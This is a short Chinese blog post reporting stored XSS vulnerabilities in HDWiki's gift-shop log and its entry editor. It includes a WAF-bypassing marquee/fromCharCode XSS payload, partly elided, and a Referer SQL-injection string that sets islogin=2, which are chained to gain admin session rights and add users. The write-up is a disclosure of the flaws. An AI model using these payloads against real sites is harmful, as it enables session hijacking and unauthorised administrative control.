---
title: hdwiki 一些存储型xss
date: 2014-2-27 02:47
tags:
---

官方下载最新版本

##### 1. hdwiki 礼品商店存储型漏洞

无任何过滤，后台模块-> 礼品商店 -> 礼品兑换日志 
![2019-07-19-04-06-57](https://wolvez.oss-cn-hangzhou.aliyuncs.com/9558de8ec69ff1ae00cde24d346e20ea.png)

![2019-07-19-04-07-10](https://wolvez.oss-cn-hangzhou.aliyuncs.com/67bc09d4da7cae27a27f4e2f239a4cb3.png)

#### 2. 创建或编辑词条 存储型xss
![2019-07-19-04-07-41](https://wolvez.oss-cn-hangzhou.aliyuncs.com/64fbe1434874fd56a597100579540818.png)
exp :
过狗
`<marquee onstart='javascript:document.write(String.fromCharCode(60, 115, 99, 114, 105, 112,此处省略))'></marquee>`


**hdwiki** 管理**cookie** 是无法直接 进入后台 以及执行其它后台操作
**session** 表中 **islogin=2**  才可以进后台

配合最近一个鸡肋 **Referer**注入（相关文章：http://hi.baidu.com/h4ckey/item/8bc0c30dbceb6ec2905718af ）:  
admin_',islogin=2 #  //by @BinAry
访问过后台 islogin=2 才可以进行后台操作 (ajax 添加用户)